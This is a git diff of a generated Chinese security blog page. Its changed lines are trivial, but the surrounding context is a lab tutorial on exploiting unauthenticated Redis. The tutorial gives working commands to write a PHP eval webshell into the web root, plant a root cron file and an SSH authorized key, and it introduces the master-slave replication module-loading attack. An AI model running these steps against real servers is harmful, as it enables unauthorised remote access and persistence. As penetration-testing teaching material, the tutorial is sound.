@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="Ex1t" type="application/atom+xml">
 </head>
@@ -439,6 +439,7 @@
 protected-mode no  关闭安全模式
 使用root权限 
 等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>（被攻击机器）靶机安装好一个redis后，修改redis.conf后以root权限启动。</p>
 <h4 id="2-1-2、常用命令"><a href="#2-1-2、常用命令" class="headerlink" title="2.1.2、常用命令"></a>2.1.2、常用命令</h4><ol>
 <li>查看信息：<code>info</code> </li>
@@ -454,14 +455,17 @@ protected-mode no  关闭安全模式
 </ol>
 <h4 id="2-1-3、利用方法"><a href="#2-1-3、利用方法" class="headerlink" title="2.1.3、利用方法"></a>2.1.3、利用方法</h4><p>（1）获取数据库信息</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli -h  <span class="token number">192.168</span>.31.152<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>即可成功进入到目标（192.168.31.152）redisl</p>
 <p>查看redis版本相关信息，也判断是否存在密码</p>
 <pre class="line-numbers language-none"><code class="language-none">info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>成功显示信息代表没有密码</p>
 <p> <img src="https://img.ex1t.xyz//1.png" alt="1"></p>
 <p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CONFIG GET <span class="token function">dir</span>         <span class="token comment">#设置目录</span>
 CONFIG GET dbfilename  <span class="token comment">#设置文件名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//2.png" alt="2"></p>
 <p>（2）写webshell</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/            <span class="token comment">#切换目录到网站的根目录（根据实际情况来） </span>
@@ -469,6 +473,7 @@ CONFIG GET dbfilename  <span class="token comment">#设置文件名</span><span 
 <span class="token builtin class-name">set</span> xx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php @eval(<span class="token variable">$_POST</span>['-7']);?&gt;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>  <span class="token comment">#写入一句话木马 </span>
 config <span class="token builtin class-name">set</span> dbfilename shell.php                    <span class="token comment">#生成木马文件shell.php </span>
 save                                               <span class="token comment">#进行保存</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//3.png" alt="3"></p>
 <p>成功写入到目标机</p>
 <p> <img src="https://img.ex1t.xyz//4.png" alt="4"></p>
@@ -480,6 +485,7 @@ redis-cli -h <span class="token number">192.168</span>.31.152 <span class="token
 config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/   <span class="token comment">#设置目录为目标机定时任务目录 </span>
 config <span class="token builtin class-name">set</span> dbfilename root        <span class="token comment">#设置文件名 </span>
 save                              <span class="token comment">#保存</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//5.png" alt="5"></p>
 <p>写入成功</p>
 <p> <img src="https://img.ex1t.xyz//6.png" alt="6"></p>
@@ -489,12 +495,15 @@ save                              <span class="token comment">#保存</span><spa
 <p>攻击机：192.168.31.116</p>
 <p>生成密钥</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//7.png" alt="7"></p>
 <p>将公钥内容导出到文本中</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://img.ex1t.xyz//8.png" alt="8"></p>
 <p>写入目标机器</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> key.txt <span class="token operator">|</span> redis-cli -h <span class="token number">192.168</span>.31.152 -x <span class="token builtin class-name">set</span> xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//9.png" alt="9"></p>
 <p><img src="https://img.ex1t.xyz//10.png" alt="10"></p>
 <p>设置路径、文件名保存，路径根据实际情况来改动</p>
@@ -502,12 +511,14 @@ save                              <span class="token comment">#保存</span><spa
 <p>写入成功</p>
 <p><img src="https://img.ex1t.xyz//12.png" alt="12"></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i id_rsa <span class="token number">192.168</span>.31.152<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>登录成功</p>
 <p><img src="https://img.ex1t.xyz//13.png" alt="13"></p>
 <h3 id="2-2、主从复制"><a href="#2-2、主从复制" class="headerlink" title="2.2、主从复制"></a>2.2、主从复制</h3><h4 id="2-2-1、漏洞版本"><a href="#2-2-1、漏洞版本" class="headerlink" title="2.2.1、漏洞版本"></a>2.2.1、漏洞版本</h4><p>主从复制存在漏洞的版本</p>
 <p><code>Redis &lt;= 5.0.5</code></p>
 <h4 id="2-2-2、环境部署"><a href="#2-2-2、环境部署" class="headerlink" title="2.2.2、环境部署"></a>2.2.2、环境部署</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker pull damonevking/redis5.0  
 docker run -p <span class="token number">6379</span>:6379 -d damonevking/redis5.0 redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//14.png" alt="14"></p>
 <h4 id="2-2-3、攻击原理"><a href="#2-2-3、攻击原理" class="headerlink" title="2.2.3、攻击原理"></a>2.2.3、攻击原理</h4><p>Redis是一个使用ANSIC编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。</p>
 <p>但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。</p>
